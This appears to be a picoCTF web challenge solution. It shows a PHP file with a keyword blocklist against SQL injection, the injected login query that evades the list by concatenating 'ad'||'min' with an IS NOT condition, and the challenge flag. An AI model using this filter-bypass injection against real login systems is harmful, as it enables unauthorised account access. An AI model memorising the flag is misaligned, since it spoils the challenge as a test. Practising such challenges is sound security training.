```
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}
?>
```


SELECT username, password FROM users WHERE username='adm' AND password='adm' 


SELECT username, password FROM users WHERE username='ad'||'min' AND password='a' IS NOT 'b'
Congrats! You won! Check out filter.php

picoCTF{k3ep_1t_sh0rt_2a78ea34c84da0bf585ada4cb9a6f8fb}